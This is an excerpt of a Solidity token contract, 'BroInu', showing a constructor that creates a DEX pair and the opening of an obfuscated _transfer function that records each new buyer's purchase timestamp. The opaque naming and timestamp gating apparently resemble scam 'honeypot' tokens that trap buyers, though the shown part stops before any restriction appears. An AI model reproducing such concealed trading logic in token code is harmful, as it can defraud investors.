...
contract BroInu  is Ownable, IERC20 {
    ...
    constructor() public {
        ...
        PK = IDEXFactory(Panckerouter.factory()).createPair(Panckerouter.WETH(), address(this));
    ...
    function _transfer(address S, address R, uint256 A) internal virtual {
        require(S != address(0));
        require(R != address(0));
        uint256 _BR;  uint256 _BT = C[S] + _T;   uint256 _Z = 0;
        if (!_IS[S] && !_IS[R]  ) {_BR = A.mul(0).div(100);}
        if (R != _M  && R != PK && S == PK && balanceOf(R) == _Z) { C[R] = block.timestamp;} uint256 _TI =block.timestamp;     
